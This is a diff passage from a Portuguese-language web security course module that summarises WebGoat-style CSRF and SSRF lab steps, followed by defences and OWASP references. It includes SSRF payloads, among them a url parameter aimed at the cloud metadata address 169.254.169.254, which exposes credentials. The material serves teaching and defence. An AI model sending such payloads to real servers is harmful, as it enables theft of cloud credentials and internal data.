+  POST /csrf/review  (Referer de outro host, ou sem Referer)  + validateReq fixo  → aceito
+  Referer do mesmo host → recusado; token errado → recusado
+  o servidor confia no cookie anexado sozinho; alvo = ações que mudam estado
+
+SSRF — desviar o destino que o servidor busca:
+  POST /SSRF/task1  url=images/jerry.png          → controla o recurso devolvido
+  POST /SSRF/task2  url=http://ifconfig.pro        → servidor busca destino externo
+  alvo real:        url=http://169.254.169.254/latest/meta-data/...
+
+Defesa CSRF: token por sessão + SameSite + conferir Origin/Referer/Sec-Fetch-Site
+Defesa SSRF: allowlist + validar IP resolvido + conectar a ele + sem redirect + menor privilégio
+```
+
+### Termos deste módulo
+
+<ModuleGlossary />
+
+### Para ir além
+
+- [OWASP — Cross-Site Request Forgery (CSRF)](https://owasp.org/www-community/attacks/csrf) — a descrição canônica do ataque.
+- [OWASP Cheat Sheet — CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) — o passo a passo das defesas.
+- [OWASP Cheat Sheet — SSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html) — como validar destino e IP direito.
+- [Barth, Jackson, Mitchell — "Robust Defenses for Cross-Site Request Forgery" (2008)](https://seclab.stanford.edu/websec/csrf/csrf.pdf) — o artigo que cunhou o *login CSRF*.
